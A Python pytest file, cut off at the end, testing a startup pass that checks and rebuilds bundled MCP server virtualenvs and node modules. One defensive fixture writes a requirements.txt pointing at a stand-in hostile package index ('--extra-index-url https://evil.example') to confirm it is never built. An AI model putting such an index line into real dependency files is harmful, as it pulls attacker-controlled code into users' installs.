"""Tests for the startup pass that ensures bundled MCP venvs are current.

Covers the freshness check semantics (missing/stale → rebuild, fresh → skip),
runtime dispatch (docker/python/node), graceful handling of bad manifests,
and the absence-of-MCPS_DIR case. ``install_mcp`` itself is mocked — its
behavior is covered separately in ``test_mcp_installer.py``.
"""

from __future__ import annotations

import asyncio
import json
import sys
import time
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import AsyncMock, patch

import pytest

import config
from services.mcp import mcp_installer, mcp_venv_bootstrap
from services.mcp.mcp_installer import InstallResult


@pytest.fixture(autouse=True)
def _no_mcp_installs_at_boot():
    """This module tests the pass itself, on its own folders."""


def _make_mcp(root: Path, category: str, name: str, manifest: dict) -> Path:
    """Helper: drop a fake MCP folder under ``root/<category>/<name>/``."""
    mcp_dir = root / category / name
    mcp_dir.mkdir(parents=True, exist_ok=True)
    (mcp_dir / "manifest.json").write_text(json.dumps(manifest))
    return mcp_dir



@pytest.fixture(autouse=True)
def _a_builds_own_process(monkeypatch):
    """A build runs where an entry said its process is a build's
    (``build_for_image``, ``build_in_place``), for that whole process: each
    test starts as one and gets the mark back as it was."""
    monkeypatch.setattr(mcp_venv_bootstrap, "_build_process", True)


@pytest.fixture
def fake_mcps_root(tmp_path, monkeypatch):
    """Point ``config.MCPS_DIR`` at a temp dir for the duration of the test."""
    root = tmp_path / "mcps"
    root.mkdir()
    (root / "custom").mkdir()
    (root / "community").mkdir()
    monkeypatch.setattr(config, "MCPS_DIR", root)
    return root


# ─────────────────────── _venv_is_stale ────────────────────────────────


def test_stale_when_venv_missing(tmp_path):
    deps = tmp_path / "requirements.txt"
    deps.write_text("foo==1.0\n")
    venv = tmp_path / "venv"  # not created
    assert mcp_venv_bootstrap._venv_is_stale(deps, venv) is True


def test_fresh_when_venv_newer(tmp_path):
    deps = tmp_path / "requirements.txt"
    deps.write_text("foo==1.0\n")
    venv = tmp_path / "venv"
    venv.mkdir()
    # Bump venv mtime past deps' mtime
    future = time.time() + 60
    import os
    os.utime(venv, (future, future))
    assert mcp_venv_bootstrap._venv_is_stale(deps, venv) is False


def test_stale_when_deps_newer(tmp_path):
    venv = tmp_path / "venv"
    venv.mkdir()
    deps = tmp_path / "requirements.txt"
    deps.write_text("foo==1.0\n")
    # Bump deps mtime past venv's mtime
    future = time.time() + 60
    import os
    os.utime(deps, (future, future))
    assert mcp_venv_bootstrap._venv_is_stale(deps, venv) is True


# ─────────────────── ensure_bundled_venvs_at_startup ──────────────────


@pytest.mark.asyncio
async def test_no_mcps_root_returns_empty(monkeypatch, tmp_path):
    """If MCPS_DIR doesn't exist, function returns empty dict + logs."""
    monkeypatch.setattr(config, "MCPS_DIR", tmp_path / "does-not-exist")
    results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {}


@pytest.mark.asyncio
async def test_skips_docker_runtime(fake_mcps_root):
    _make_mcp(fake_mcps_root, "custom", "docker-mcp", {
        "name": "docker-mcp",
        "server": {"runtime": "docker"},
    })
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as m:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"docker-mcp": "skipped-docker"}
        m.assert_not_awaited()


@pytest.mark.asyncio
async def test_skips_python_mcp_without_requirements(fake_mcps_root):
    _make_mcp(fake_mcps_root, "custom", "no-deps-mcp", {
        "name": "no-deps-mcp",
        "server": {"runtime": "python"},
    })
    # No requirements.txt
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as m:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"no-deps-mcp": "skipped-no-reqs"}
        m.assert_not_awaited()


@pytest.mark.asyncio
async def test_skips_bundled_node_runtime(fake_mcps_root):
    _make_mcp(fake_mcps_root, "custom", "node-mcp", {
        "name": "node-mcp",
        "server": {"runtime": "node"},
    })
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as m:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"node-mcp": "skipped-bundled-node"}
        m.assert_not_awaited()


@pytest.mark.asyncio
async def test_unknown_runtime_labeled(fake_mcps_root):
    _make_mcp(fake_mcps_root, "custom", "weird-mcp", {
        "name": "weird-mcp",
        "server": {"runtime": "rust"},
    })
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock):
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"weird-mcp": "skipped-runtime-rust"}


@pytest.mark.asyncio
async def test_python_missing_venv_triggers_install(fake_mcps_root):
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "py-mcp", {
        "name": "py-mcp",
        "server": {"runtime": "python"},
    })
    (mcp_dir / "requirements.txt").write_text("requests==2.31\n")
    # No venv directory exists

    with patch(
        "services.mcp.mcp_installer.install_mcp",
        new_callable=AsyncMock,
        return_value=InstallResult(ok=True, log="installed", version_hash="abc"),
    ) as m:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"py-mcp": "ok"}
        m.assert_awaited_once()
        args, kwargs = m.await_args
        assert args[0] == mcp_dir
        assert args[1] == "python"
        assert args[2] == ""  # empty source = bundled-python branch


@pytest.mark.asyncio
async def test_python_fresh_venv_is_skipped(fake_mcps_root):
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "py-mcp", {
        "name": "py-mcp",
        "server": {"runtime": "python"},
    })
    deps = mcp_dir / "requirements.txt"
    deps.write_text("requests==2.31\n")
    venv = mcp_dir / "venv"
    venv.mkdir()
    # Bump venv mtime past deps' mtime + success-mark it (an unmarked EMPTY
    # venv is the poisoned interrupted-install shape and rebuilds by design).
    import os
    future = time.time() + 60
    os.utime(venv, (future, future))
    mcp_venv_bootstrap._write_marker(
        mcp_dir,
        requirements_sha256=mcp_venv_bootstrap._requirements_hash(deps),
    )

    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as m:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"py-mcp": "fresh"}
        m.assert_not_awaited()


@pytest.mark.asyncio
async def test_python_stale_venv_triggers_install(fake_mcps_root):
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "py-mcp", {
        "name": "py-mcp",
        "server": {"runtime": "python"},
    })
    deps = mcp_dir / "requirements.txt"
    venv = mcp_dir / "venv"
    venv.mkdir()
    # Now write deps with a newer mtime
    deps.write_text("requests==2.31\nclick==8.1\n")
    import os
    future = time.time() + 60
    os.utime(deps, (future, future))

    with patch(
        "services.mcp.mcp_installer.install_mcp",
        new_callable=AsyncMock,
        return_value=InstallResult(ok=True, log="updated", version_hash="def"),
    ) as m:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"py-mcp": "ok"}
        m.assert_awaited_once()


@pytest.mark.asyncio
async def test_install_failure_reported(fake_mcps_root):
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "py-mcp", {
        "name": "py-mcp",
        "server": {"runtime": "python"},
    })
    (mcp_dir / "requirements.txt").write_text("nonexistent-pkg==1.0\n")

    with patch(
        "services.mcp.mcp_installer.install_mcp",
        new_callable=AsyncMock,
        return_value=InstallResult(ok=False, log="pip error"),
    ):
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"py-mcp": "failed"}


@pytest.mark.asyncio
async def test_install_exception_caught(fake_mcps_root):
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "py-mcp", {
        "name": "py-mcp",
        "server": {"runtime": "python"},
    })
    (mcp_dir / "requirements.txt").write_text("foo==1.0\n")

    with patch(
        "services.mcp.mcp_installer.install_mcp",
        new_callable=AsyncMock,
        side_effect=RuntimeError("disk full"),
    ):
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"py-mcp": "exception"}


@pytest.mark.asyncio
async def test_bad_manifest_skipped(fake_mcps_root, caplog):
    mcp_dir = fake_mcps_root / "custom" / "broken-mcp"
    mcp_dir.mkdir()
    (mcp_dir / "manifest.json").write_text("{ not valid json")

    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as m:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {}  # bad manifest never enters the dict
        m.assert_not_awaited()
    # Warning was logged
    assert any("bad manifest" in r.message for r in caplog.records)


@pytest.mark.asyncio
async def test_walks_both_categories(fake_mcps_root):
    """Both custom/ AND community/ subtrees are scanned."""
    _make_mcp(fake_mcps_root, "custom", "from-custom", {
        "name": "from-custom",
        "server": {"runtime": "docker"},
    })
    _make_mcp(fake_mcps_root, "community", "from-community", {
        "name": "from-community",
        "server": {"runtime": "docker"},
    })
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock):
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {
            "from-custom": "skipped-docker",
            "from-community": "skipped-docker",
        }


@pytest.mark.asyncio
async def test_manifest_name_overrides_dir_name(fake_mcps_root):
    """Canonical name from manifest is used, even when dir name differs."""
    mcp_dir = fake_mcps_root / "community" / "workspace-mcp"
    mcp_dir.mkdir()
    (mcp_dir / "manifest.json").write_text(json.dumps({
        "name": "google-workspace",  # canonical slug, not folder name
        "server": {"runtime": "docker"},
    }))
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock):
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert "google-workspace" in results
        assert "workspace-mcp" not in results


# ──────────────────── python-interpreter reconciliation ────────────────


def _write_pyvenv(venv_dir: Path, major: int, minor: int, micro: int = 0) -> None:
    venv_dir.mkdir(parents=True, exist_ok=True)
    (venv_dir / "pyvenv.cfg").write_text(
        f"home = /usr/bin\nversion = {major}.{minor}.{micro}\n"
    )


def test_venv_python_minor_parses(tmp_path):
    venv = tmp_path / "venv"
    _write_pyvenv(venv, 3, 10, 12)
    assert mcp_installer.venv_python_minor(venv) == (3, 10)


def test_venv_python_minor_missing_or_garbled(tmp_path):
    venv = tmp_path / "venv"
    venv.mkdir()
    assert mcp_installer.venv_python_minor(venv) is None  # no pyvenv.cfg
    (venv / "pyvenv.cfg").write_text("home = /usr/bin\n")  # no version line
    assert mcp_installer.venv_python_minor(venv) is None


def test_needs_python_reconcile_missing_venv(tmp_path):
    assert mcp_venv_bootstrap._needs_python_reconcile(tmp_path / "venv", (3, 13), tmp_path) is False


def test_needs_python_reconcile_older_interpreter(tmp_path):
    venv = tmp_path / "venv"
    _write_pyvenv(venv, 3, 10)
    assert mcp_venv_bootstrap._needs_python_reconcile(venv, (3, 13), tmp_path) is True


def test_needs_python_reconcile_current_or_newer(tmp_path):
    venv = tmp_path / "venv"
    _write_pyvenv(venv, 3, 13)
    assert mcp_venv_bootstrap._needs_python_reconcile(venv, (3, 13), tmp_path) is False
    _write_pyvenv(venv, 3, 14)
    assert mcp_venv_bootstrap._needs_python_reconcile(venv, (3, 13), tmp_path) is False


def test_needs_python_reconcile_ceiling_marker_skips(tmp_path):
    """venv below target but already reconciled to it (real requires-python ceiling)."""
    venv = tmp_path / "venv"
    _write_pyvenv(venv, 3, 13)
    (tmp_path / mcp_venv_bootstrap._RUNTIME_MARKER).write_text(json.dumps({"python": "3.14"}))
    assert mcp_venv_bootstrap._needs_python_reconcile(venv, (3, 14), tmp_path) is False


def test_needs_python_reconcile_stale_marker_rebuilds(tmp_path):
    """A marker from an OLD target doesn't suppress a new reconcile."""
    venv = tmp_path / "venv"
    _write_pyvenv(venv, 3, 10)
    (tmp_path / mcp_venv_bootstrap._RUNTIME_MARKER).write_text(json.dumps({"python": "3.12"}))
    assert mcp_venv_bootstrap._needs_python_reconcile(venv, (3, 13), tmp_path) is True


@pytest.mark.asyncio
async def test_interpreter_stale_rebuilds_pinned_and_marks(fake_mcps_root):
    """A venv on an older interpreter is rmtree'd, rebuilt pinned to target, marked."""
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "py-mcp", {
        "name": "py-mcp", "server": {"runtime": "python"},
    })
    (mcp_dir / "requirements.txt").write_text("requests==2.31\n")
    venv = mcp_dir / "venv"
    # Built on one minor BELOW the test runner → interpreter-stale...
    _write_pyvenv(venv, sys.version_info[0], sys.version_info[1] - 1)
    # ...but venv mtime newer than reqs, so this is NOT the mtime path.
    import os
    future = time.time() + 60
    os.utime(venv, (future, future))

    spec = f"{sys.version_info[0]}.{sys.version_info[1]}"
    with patch("services.mcp.mcp_venv_bootstrap.find_uv", return_value="/fake/uv"), \
         patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=True, log="ok", version_hash="h",
                                          venv_python=spec)) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()

    assert results == {"py-mcp": "ok-py-reconcile"}
    inst.assert_awaited_once()
    assert inst.await_args.kwargs["python_spec"] == spec   # pinned to the proxy
    assert not venv.exists()             # old venv removed (the install is mocked)
    marker = json.loads((mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).read_text())
    assert marker["python"] == f"{sys.version_info[0]}.{sys.version_info[1]}"


@pytest.mark.asyncio
async def test_interpreter_current_is_fresh(fake_mcps_root):
    """A venv on the proxy's own interpreter is not reconciled."""
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "py-mcp", {
        "name": "py-mcp", "server": {"runtime": "python"},
    })
    (mcp_dir / "requirements.txt").write_text("requests==2.31\n")
    venv = mcp_dir / "venv"
    _write_pyvenv(venv, sys.version_info[0], sys.version_info[1])
    import os
    future = time.time() + 60
    os.utime(venv, (future, future))
    mcp_venv_bootstrap._write_marker(
        mcp_dir,
        requirements_sha256=mcp_venv_bootstrap._requirements_hash(
            mcp_dir / "requirements.txt"),
    )

    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"py-mcp": "fresh"}
    inst.assert_not_awaited()


# ───────────────────── node native-addon reconciliation ────────────────


@pytest.mark.asyncio
async def test_node_absent_marker_records_no_rebuild(fake_mcps_root):
    """A freshly-built node_modules (no marker) is recorded, not rebuilt."""
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "node-mcp", {
        "name": "node-mcp", "server": {"runtime": "node"},
    })
    (mcp_dir / "node_modules").mkdir()
    with patch("services.mcp.mcp_venv_bootstrap._node_major", return_value=24), \
         patch("asyncio.create_subprocess_exec", new_callable=AsyncMock) as spawn:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"node-mcp": "skipped-bundled-node"}
    spawn.assert_not_awaited()  # no npm rebuild on first encounter
    marker = json.loads((mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).read_text())
    assert marker["node_major"] == 24


def _finished_process(rc: int, out: bytes):
    """A process that already ended, its output on a real stream: every read
    ends at end-of-stream, as a pipe's does. Built inside the test's loop."""
    stdout = asyncio.StreamReader()
    stdout.feed_data(out)
    stdout.feed_eof()

    async def _wait():
        return rc
    return SimpleNamespace(returncode=rc, stdout=stdout, pid=0, wait=_wait)


@pytest.mark.asyncio
async def test_node_major_change_triggers_rebuild(fake_mcps_root):
    """A node MAJOR change since node_modules was built → npm rebuild + remark."""
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "node-mcp", {
        "name": "node-mcp", "server": {"runtime": "node"},
    })
    (mcp_dir / "node_modules").mkdir()
    (mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).write_text(json.dumps({"node_major": 22}))

    fake_proc = _finished_process(0, b"rebuilt")
    with patch("services.mcp.mcp_venv_bootstrap._node_major", return_value=24), \
         patch("asyncio.create_subprocess_exec", new_callable=AsyncMock, return_value=fake_proc):
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"node-mcp": "ok-node-rebuild"}
    marker = json.loads((mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).read_text())
    assert marker["node_major"] == 24


@pytest.mark.asyncio
async def test_node_rebuild_failure_is_advisory(fake_mcps_root):
    """A failed npm rebuild is reported but never fatal; marker is NOT advanced."""
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "node-mcp", {
        "name": "node-mcp", "server": {"runtime": "node"},
    })
    (mcp_dir / "node_modules").mkdir()
    (mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).write_text(json.dumps({"node_major": 22}))

    fake_proc = _finished_process(1, b"gyp error")
    with patch("services.mcp.mcp_venv_bootstrap._node_major", return_value=24), \
         patch("asyncio.create_subprocess_exec", new_callable=AsyncMock, return_value=fake_proc):
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"node-mcp": "skipped-node-rebuild-fail"}
    marker = json.loads((mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).read_text())
    assert marker["node_major"] == 22  # unchanged — retried next boot


class TestSuccessMarkerStaleness:
    """Interrupted installs poison the mtime heuristic (live-hit 2026-07-11):
    the success marker (requirements sha256, written only after a dep sync
    exits 0) is what the staleness check trusts."""

    def _mcp(self, tmp_path, with_pkg):
        from services.mcp.mcp_venv_bootstrap import _requirements_hash
        mcp = tmp_path / "m"
        mcp.mkdir()
        req = mcp / "requirements.txt"
        req.write_text("fastmcp\n")
        venv = mcp / "venv"
        venv.mkdir()  # created after reqs → mtime-fresh
        if with_pkg:
            sp = venv / "lib" / "python3.13" / "site-packages" / "pkg-1.0.dist-info"
            sp.mkdir(parents=True)
        return mcp, req, venv, _requirements_hash(req)

    def test_interrupted_install_is_stale(self, tmp_path):
        from services.mcp.mcp_venv_bootstrap import _venv_is_stale
        mcp, req, venv, _ = self._mcp(tmp_path, with_pkg=False)
        assert _venv_is_stale(req, venv, mcp) is True

    def test_healthy_unmarked_venv_backfills_without_rebuild(self, tmp_path):
        from services.mcp.mcp_venv_bootstrap import _read_marker, _venv_is_stale
        mcp, req, venv, h = self._mcp(tmp_path, with_pkg=True)
        assert _venv_is_stale(req, venv, mcp) is False
        assert _read_marker(mcp).get("requirements_sha256") == h

    def test_marker_match_is_fresh_even_when_venv_empty(self, tmp_path):
        from services.mcp.mcp_venv_bootstrap import _venv_is_stale, _write_marker
        mcp, req, venv, h = self._mcp(tmp_path, with_pkg=False)
        _write_marker(mcp, requirements_sha256=h)
        assert _venv_is_stale(req, venv, mcp) is False

    def test_marker_mismatch_is_stale(self, tmp_path):
        from services.mcp.mcp_venv_bootstrap import _venv_is_stale, _write_marker
        mcp, req, venv, _ = self._mcp(tmp_path, with_pkg=True)
        _write_marker(mcp, requirements_sha256="deadbeef")
        assert _venv_is_stale(req, venv, mcp) is True

    def test_marker_match_outranks_a_requirements_file_a_checkout_touched(self, tmp_path):
        """A sync never bumps the venv folder's own mtime: with the mtime
        first, every start after a checkout rebuilt every venv."""
        import os

        from services.mcp.mcp_venv_bootstrap import _venv_is_stale, _write_marker
        mcp, req, venv, h = self._mcp(tmp_path, with_pkg=True)
        _write_marker(mcp, requirements_sha256=h)
        future = time.time() + 60
        os.utime(req, (future, future))
        assert _venv_is_stale(req, venv, mcp) is False
        req.write_text("fastmcp\nclick\n")
        os.utime(req, (future, future))
        assert _venv_is_stale(req, venv, mcp) is True

    def test_unmarked_venv_older_than_its_requirements_is_stale(self, tmp_path):
        import os

        from services.mcp.mcp_venv_bootstrap import _read_marker, _venv_is_stale
        mcp, req, venv, _ = self._mcp(tmp_path, with_pkg=True)
        future = time.time() + 60
        os.utime(req, (future, future))
        assert _venv_is_stale(req, venv, mcp) is True
        assert "requirements_sha256" not in _read_marker(mcp)

    def test_no_mcp_dir_keeps_pure_mtime_behavior(self, tmp_path):
        from services.mcp.mcp_venv_bootstrap import _venv_is_stale
        _, req, venv, _ = self._mcp(tmp_path, with_pkg=False)
        assert _venv_is_stale(req, venv) is False


@pytest.mark.asyncio
async def test_node_addon_rebuild_runs_for_platform_shipped_folders_only(fake_mcps_root, monkeypatch):
    """``npm rebuild`` runs a package's lifecycle scripts, which the
    install refuses; only the folders shipped with the platform get it."""
    for cat in ("custom", "community"):
        d = _make_mcp(fake_mcps_root, cat, f"node-{cat}",
                      {"name": f"node-{cat}", "server": {"runtime": "node"}})
        (d / "node_modules").mkdir()
        (d / mcp_venv_bootstrap._RUNTIME_MARKER).write_text(json.dumps({"node_major": 22}))
    rebuilt: list[str] = []

    async def _rebuild(step, _causes):
        rebuilt.append(step.mcp_dir.parent.name)
        return "ok-node-rebuild"

    monkeypatch.setattr(mcp_venv_bootstrap, "_node_major", lambda: 24)
    monkeypatch.setattr(mcp_venv_bootstrap, "_rebuild_node_addons", _rebuild)
    results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert rebuilt == ["custom"]
    assert results["node-custom"] == "ok-node-rebuild"
    assert results["node-community"] == "skipped-bundled-node"


@pytest.mark.asyncio
async def test_python_requirements_build_runs_for_platform_shipped_folders_only(fake_mcps_root):
    """A catalog Python MCP installs from its ``server.source`` wheels only;
    a ``requirements.txt`` in its folder is never built at boot (it would run
    an index, VCS or sdist line of the catalog's choosing as the proxy)."""
    for cat in ("custom", "community"):
        d = _make_mcp(fake_mcps_root, cat, f"py-{cat}",
                      {"name": f"py-{cat}", "server": {"runtime": "python"}})
        (d / "requirements.txt").write_text("--extra-index-url https://evil.example\nx\n")
        _write_pyvenv(d / "venv", sys.version_info[0], sys.version_info[1] - 1)
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=True, log="ok", version_hash="h")) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert [c.args[0].parent.name for c in inst.await_args_list] == ["custom"]
    assert results["py-custom"] in ("ok", "ok-py-reconcile")
    assert results["py-community"] == "skipped-community-python"
    # the community venv is left exactly as it was
    assert (fake_mcps_root / "community" / "py-community" / "venv" / "pyvenv.cfg").is_file()


# ───── the npm rebuild and the pinned venv run as every install subprocess does ─────


def _alive(pid: int) -> bool:
    try:
        stat = Path(f"/proc/{pid}/stat").read_text()
    except OSError:
        return False
    return stat.rsplit(")", 1)[1].split()[0] not in ("Z", "X")


def _node_mcp_due_for_rebuild(root: Path) -> Path:
    mcp_dir = _make_mcp(root, "custom", "node-mcp", {
        "name": "node-mcp", "server": {"runtime": "node"},
    })
    (mcp_dir / "node_modules").mkdir()
    (mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).write_text(json.dumps({"node_major": 22}))
    return mcp_dir


@pytest.mark.asyncio
async def test_npm_rebuild_runs_under_the_installers_environment(fake_mcps_root, monkeypatch):
    """``npm rebuild`` runs the packages' lifecycle scripts: they see the
    installer's allowlisted environment, never the proxy's secrets."""
    monkeypatch.setenv("JWT_SECRET", "s3")
    _node_mcp_due_for_rebuild(fake_mcps_root)
    fake_proc = _finished_process(0, b"rebuilt")
    with patch("services.mcp.mcp_venv_bootstrap._node_major", return_value=24), \
         patch("asyncio.create_subprocess_exec", new_callable=AsyncMock,
               return_value=fake_proc) as spawn:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"node-mcp": "ok-node-rebuild"}
    env = spawn.await_args.kwargs["env"]
    assert env is not None and "JWT_SECRET" not in env
    assert env["UV_NO_CONFIG"] == "1"


@pytest.mark.asyncio
@pytest.mark.skipif(not sys.platform.startswith("linux"), reason="reads /proc")
async def test_a_hung_npm_rebuild_is_killed_and_retried_next_boot(fake_mcps_root, tmp_path, monkeypatch):
    import asyncio
    import os

    from services.mcp import mcp_installer
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    pids = tmp_path / "npm.pids"
    npm = bin_dir / "npm"
    npm.write_text(f'#!/bin/sh\necho $$ >> "{pids}"\nsleep 20 & echo $! >> "{pids}"\nsleep 20\n')
    npm.chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}:{os.environ.get('PATH', '/usr/bin')}")
    monkeypatch.setattr(mcp_installer, "DEFAULT_INSTALL_TIMEOUT", 1)
    mcp_dir = _node_mcp_due_for_rebuild(fake_mcps_root)
    with patch("services.mcp.mcp_venv_bootstrap._node_major", return_value=24):
        results = await asyncio.wait_for(mcp_venv_bootstrap.ensure_bundled_venvs_at_startup(), 10)
    assert results == {"node-mcp": "skipped-node-rebuild-fail"}
    marker = json.loads((mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).read_text())
    assert marker["node_major"] == 22
    for _ in range(40):
        if not any(_alive(int(p)) for p in pids.read_text().split()):
            break
        await asyncio.sleep(0.05)
    assert not [p for p in pids.read_text().split() if _alive(int(p))]




# ───── the first venv, a failed pin, a venv outside the sandbox, the prune ─────


_SPEC = f"{sys.version_info[0]}.{sys.version_info[1]}"


def _custom_py(root: Path, name: str = "py-mcp") -> Path:
    d = _make_mcp(root, "custom", name, {"name": name, "server": {"runtime": "python"}})
    (d / "requirements.txt").write_text("requests==2.31\n")
    return d


def _marker(mcp_dir: Path) -> dict:
    return json.loads((mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).read_text())


@pytest.mark.asyncio
async def test_the_first_venv_is_pinned_to_the_proxy_and_inside_the_sandbox(fake_mcps_root):
    mcp_dir = _custom_py(fake_mcps_root)
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=True, log="ok", venv_python=_SPEC)) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"py-mcp": "ok"}
    kw = inst.await_args.kwargs
    assert kw["python_spec"] == _SPEC
    roots = kw["sandbox_roots"]
    assert (fake_mcps_root.resolve() / ".uv-python") in roots
    assert mcp_dir.resolve() in roots and Path("/usr").resolve() in roots  # noqa: ASYNC240  # a test resolving its fixture folder and /usr
    assert _marker(mcp_dir)["python"] == _SPEC


@pytest.mark.asyncio
async def test_a_failed_pin_is_recorded_and_waits_a_day(fake_mcps_root, caplog, monkeypatch):
    # A pin can only fail where uv exists to attempt it: without uv the venv
    # reads reconciled (the host decides, not the test's machine).
    monkeypatch.setattr(mcp_venv_bootstrap, "find_uv", lambda: "/fake/uv")
    mcp_dir = _custom_py(fake_mcps_root)
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=True, log="ok", venv_python="")):
        assert await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup() == {"py-mcp": "ok"}
    marker = _marker(mcp_dir)
    assert "python" not in marker
    assert marker["python_pin_failed"]["target"] == _SPEC

    # The next start finds the venv on an older interpreter: left alone today.
    _write_pyvenv(mcp_dir / "venv", sys.version_info[0], sys.version_info[1] - 1)
    import os
    future = time.time() + 60
    os.utime(mcp_dir / "venv", (future, future))
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"py-mcp": "fresh"}
    inst.assert_not_awaited()
    assert "tried again a day later" in caplog.text

    # A day later it is tried again.
    from datetime import datetime, timedelta, timezone
    marker = _marker(mcp_dir)
    marker["python_pin_failed"]["at"] = (
        datetime.now(timezone.utc) - timedelta(hours=25)).isoformat()
    (mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).write_text(json.dumps(marker))
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=True, log="ok", venv_python=_SPEC)) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"py-mcp": "ok-py-reconcile"}
    assert _marker(mcp_dir)["python"] == _SPEC
    assert "python_pin_failed" not in _marker(mcp_dir)


def _outside_venv(mcp_dir: Path, tmp_path: Path) -> None:
    venv = mcp_dir / "venv"
    (venv / "bin").mkdir(parents=True, exist_ok=True)
    elsewhere = tmp_path / "home" / ".local" / "share" / "uv" / "python" / "bin"
    elsewhere.mkdir(parents=True)
    (elsewhere / "python3.13").write_text("")
    (venv / "pyvenv.cfg").write_text(
        f"home = {elsewhere}\nversion_info = {sys.version_info[0]}.{sys.version_info[1]}.0\n")
    (venv / "bin" / "python").symlink_to(elsewhere / "python3.13")
    (venv / "lib" / "python3.13" / "site-packages" / "x-1.dist-info").mkdir(parents=True)


@pytest.mark.asyncio
async def test_an_adopted_venv_outside_the_sandbox_is_relocated(fake_mcps_root, tmp_path, monkeypatch):
    # Only uv can move a venv (the host decides, not the test's machine).
    monkeypatch.setattr(mcp_venv_bootstrap, "find_uv", lambda: "/fake/uv")
    mcp_dir = _custom_py(fake_mcps_root)
    _outside_venv(mcp_dir, tmp_path)
    import os
    future = time.time() + 60
    os.utime(mcp_dir / "venv", (future, future))
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=True, log="ok", venv_python=_SPEC)) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"py-mcp": "ok-py-relocate"}
    inst.assert_awaited_once()
    assert not (mcp_dir / "venv").exists()  # removed before the (mocked) rebuild


@pytest.mark.asyncio
async def test_a_community_venv_outside_the_sandbox_is_only_reported(fake_mcps_root, tmp_path, caplog):
    d = _make_mcp(fake_mcps_root, "community", "pkg-mcp",
                  {"name": "pkg-mcp", "server": {"runtime": "python", "source": "pypi:x@1"}})
    _outside_venv(d, tmp_path)
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"pkg-mcp": "skipped-community-python"}
    inst.assert_not_awaited()
    assert "offers its rebuild" in caplog.text


@pytest.mark.asyncio
async def test_the_pass_ends_with_the_interpreter_prune(fake_mcps_root):
    with patch("services.mcp.mcp_installer.prune_uv_pythons", return_value=["cpython-3.11"]) as prune:
